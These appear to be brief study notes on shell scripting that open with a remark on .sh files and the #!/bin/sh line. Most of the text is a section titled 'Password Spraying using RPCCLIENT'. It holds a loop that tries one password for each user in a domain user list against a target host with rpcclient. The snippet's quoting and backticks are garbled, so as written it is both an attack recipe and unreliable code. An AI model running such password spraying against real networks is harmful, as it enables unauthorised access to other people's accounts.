shell script files end in .sh

scripts start with 
`#!/bin/sh`
this tells linux the file will be executed by /bin/sh (the standard location of the shell on linux machines)

### Password Spraying using RPCCLIENT
`# for u in 'cat domain-users.txt'; do \ 
	`echo -n "[*] user: $u" && \
	`rpcclient -U "$u%[password]" \`
		`-c "getusername;quit" [host] \`
`done`
